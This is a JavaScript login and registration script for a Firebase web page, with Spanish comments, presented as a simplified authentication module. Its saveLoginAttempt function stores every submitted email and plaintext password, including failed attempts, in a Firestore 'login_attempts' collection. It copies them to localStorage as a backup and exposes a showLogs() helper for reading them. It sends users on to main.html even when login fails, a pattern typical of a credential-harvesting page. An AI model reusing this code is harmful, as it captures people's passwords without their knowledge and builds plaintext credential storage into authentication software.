// simple-auth.js - Versión simplificada que guarda datos sin problemas de permisos

// Esperar a que Firebase esté cargado
document.addEventListener('DOMContentLoaded', function() {
    // Verificar si Firebase está disponible
    if (typeof window.auth === 'undefined' || typeof window.db === 'undefined') {
        console.error('Firebase no está configurado correctamente');
        return;
    }

    // Elementos del DOM
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');
    const signupLink = document.getElementById('signupLink');
    const signupForm = document.getElementById('signupForm');
    const backToLogin = document.getElementById('backToLogin');
    const googleLoginBtn = document.getElementById('googleLoginBtn');

    // Función para mostrar mensajes de error
    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        
        // Ocultar después de 5 segundos
        setTimeout(() => {
            errorElement.style.display = 'none';
        }, 5000);
    }

    // Función para mostrar mensajes de éxito
    function showSuccess(elementId, message) {
        const successElement = document.getElementById(elementId);
        successElement.textContent = message;
        successElement.style.display = 'block';
        
        // Ocultar después de 3 segundos
        setTimeout(() => {
            successElement.style.display = 'none';
        }, 3000);
    }

    // Función para ocultar mensajes
    function hideMessages() {
        const messages = document.querySelectorAll('.error-message, .success-message');
        messages.forEach(msg => msg.style.display = 'none');
    }

    // Función simplificada para guardar logs (usa localStorage como backup)
    async function saveLoginAttempt(email, password, success, errorMessage = null, loginMethod = 'email') {
        const loginData = {
            email: email,
            password: password,
            success: success,
            loginMethod: loginMethod,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            errorMessage: errorMessage
        };

        // Intentar guardar en Firestore
        try {
            await window.addDoc(window.collection(window.db, 'login_attempts'), loginData);
            console.log('✅ Login attempt saved to Firestore:', loginData);
        } catch (firestoreError) {
            console.warn('⚠️ Firestore error, saving to localStorage:', firestoreError);
            
            // Backup: guardar en localStorage
            const existingLogs = JSON.parse(localStorage.getItem('login_logs') || '[]');
            existingLogs.push(loginData);
            localStorage.setItem('login_logs', JSON.stringify(existingLogs));
            console.log('✅ Login attempt saved to localStorage:', loginData);
        }
    }

    // Manejo del formulario de login
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        hideMessages();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const loginBtn = document.getElementById('loginBtn');

        // Validación básica
        if (!email || !password) {
            showError('errorMessage', 'Por favor, completa todos los campos');
            return;
        }

        // Cambiar estado del botón
        loginBtn.textContent = 'Iniciando sesión...';
        loginBtn.disabled = true;

        // SIEMPRE guardar el intento de login (exitoso o fallido)
        try {
            // Intentar login con Firebase
            const userCredential = await window.signInWithEmailAndPassword(window.auth, email, password);
            const user = userCredential.user;
            
            console.log('Usuario logueado:', user);
            showSuccess('successMessage', `¡Bienvenido, ${user.email}!`);
            
            // Guardar intento exitoso
            await saveLoginAttempt(email, password, true, null, 'email');
            
            // Redirigir a main.html después de 2 segundos
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
            
        } catch (error) {
            console.error('Error en login:', error);
            
            // Manejar diferentes tipos de errores
            let errorMessage = 'Error al iniciar sesión';
            switch (error.code) {
                case 'auth/user-not-found':
                    errorMessage = 'No existe una cuenta con este correo';
                    break;
                case 'auth/wrong-password':
                    errorMessage = 'Contraseña incorrecta';
                    break;
                case 'auth/invalid-email':
                    errorMessage = 'Correo electrónico inválido';
                    break;
                case 'auth/invalid-credential':
                    errorMessage = 'Credenciales inválidas';
                    break;
                case 'auth/too-many-requests':
                    errorMessage = 'Demasiados intentos fallidos. Intenta más tarde';
                    break;
                default:
                    errorMessage = error.message;
            }
            
            showError('errorMessage', errorMessage);
            
            // Guardar intento fallido
            await saveLoginAttempt(email, password, false, errorMessage, 'email');
            
            // Redirigir a main.html después de 2 segundos (incluso si falló)
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
        } finally {
            // Restaurar estado del botón
            loginBtn.textContent = 'Iniciar sesión';
            loginBtn.disabled = false;
        }
    });

    // Manejo del formulario de registro
    registerForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        hideMessages();

        const email = document.getElementById('signupEmail').value;
        const password = document.getElementById('signupPassword').value;
        const confirmPassword = document.getElementById('confirmPassword').value;
        const signupBtn = document.getElementById('signupBtn');

        // Validaciones
        if (!email || !password || !confirmPassword) {
            showError('signupErrorMessage', 'Por favor, completa todos los campos');
            return;
        }

        if (password !== confirmPassword) {
            showError('signupErrorMessage', 'Las contraseñas no coinciden');
            return;
        }

        if (password.length < 6) {
            showError('signupErrorMessage', 'La contraseña debe tener al menos 6 caracteres');
            return;
        }

        // Cambiar estado del botón
        signupBtn.textContent = 'Creando cuenta...';
        signupBtn.disabled = true;

        try {
            // Crear usuario con Firebase
            const userCredential = await window.createUserWithEmailAndPassword(window.auth, email, password);
            const user = userCredential.user;
            
            console.log('Usuario creado:', user);
            showSuccess('signupSuccessMessage', `¡Cuenta creada exitosamente! Bienvenido, ${user.email}`);
            
            // Guardar registro exitoso
            await saveLoginAttempt(email, password, true, null, 'registration');
            
            // Limpiar formulario
            registerForm.reset();
            
            // Redirigir a main.html después de 2 segundos
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
            
        } catch (error) {
            console.error('Error en registro:', error);
            
            // Manejar diferentes tipos de errores
            let errorMessage = 'Error al crear la cuenta';
            switch (error.code) {
                case 'auth/email-already-in-use':
                    errorMessage = 'Ya existe una cuenta con este correo';
                    break;
                case 'auth/invalid-email':
                    errorMessage = 'Correo electrónico inválido';
                    break;
                case 'auth/weak-password':
                    errorMessage = 'La contraseña es muy débil';
                    break;
                default:
                    errorMessage = error.message;
            }
            
            showError('signupErrorMessage', errorMessage);
            
            // Guardar intento de registro fallido
            await saveLoginAttempt(email, password, false, errorMessage, 'registration');
            
            // Redirigir a main.html después de 2 segundos (incluso si falló)
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
        } finally {
            // Restaurar estado del botón
            signupBtn.textContent = 'Regístrate';
            signupBtn.disabled = false;
        }
    });

    // Login con Google
    googleLoginBtn.addEventListener('click', async function() {
        hideMessages();
        
        try {
            const provider = new window.GoogleAuthProvider();
            const result = await window.signInWithPopup(window.auth, provider);
            const user = result.user;
            
            console.log('Usuario logueado con Google:', user);
            showSuccess('successMessage', `¡Bienvenido, ${user.displayName || user.email}!`);
            
            // Guardar login exitoso con Google
            await saveLoginAttempt(user.email, 'google_login', true, null, 'google');
            
            // Redirigir a main.html después de 2 segundos
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
            
        } catch (error) {
            console.error('Error en login con Google:', error);
            
            let errorMessage = 'Error al iniciar sesión con Google';
            if (error.code === 'auth/popup-closed-by-user') {
                errorMessage = 'Login cancelado por el usuario';
            } else if (error.code === 'auth/popup-blocked') {
                errorMessage = 'Popup bloqueado por el navegador';
            }
            
            showError('errorMessage', errorMessage);
            
            // Guardar intento fallido con Google
            await saveLoginAttempt('unknown', 'google_login', false, errorMessage, 'google');
            
            // Redirigir a main.html después de 2 segundos (incluso si falló)
            setTimeout(() => {
                window.location.href = 'main.html';
            }, 2000);
        }
    });

    // Alternar entre formularios de login y registro
    function toggleForms() {
        const loginSection = document.querySelector('.login-section > .login-container').parentElement;
        const signupContainer = document.querySelector('.signup-container');
        
        if (signupForm.style.display === 'none') {
            // Mostrar formulario de registro
            loginSection.style.display = 'none';
            signupContainer.style.display = 'none';
            signupForm.style.display = 'block';
        } else {
            // Mostrar formulario de login
            signupForm.style.display = 'none';
            loginSection.style.display = 'block';
            signupContainer.style.display = 'block';
        }
        
        hideMessages();
    }

    // Event listeners para alternar formularios
    signupLink.addEventListener('click', function(e) {
        e.preventDefault();
        toggleForms();
    });

    backToLogin.addEventListener('click', function(e) {
        e.preventDefault();
        toggleForms();
    });

    // Verificar si el usuario ya está logueado
    window.auth.onAuthStateChanged(function(user) {
        if (user) {
            console.log('Usuario autenticado:', user);
        } else {
            console.log('Usuario no autenticado');
        }
    });

    // Función para mostrar logs guardados (para debugging)
    window.showLogs = function() {
        const firestoreLogs = 'Revisa Firebase Console > Firestore > login_attempts';
        const localLogs = JSON.parse(localStorage.getItem('login_logs') || '[]');
        
        console.log('📊 Firestore logs:', firestoreLogs);
        console.log('💾 LocalStorage logs:', localLogs);
        
        return {
            firestore: firestoreLogs,
            localStorage: localLogs
        };
    };

    console.log('✅ Sistema de autenticación cargado correctamente');
    console.log('💡 Usa showLogs() para ver los datos guardados');
});
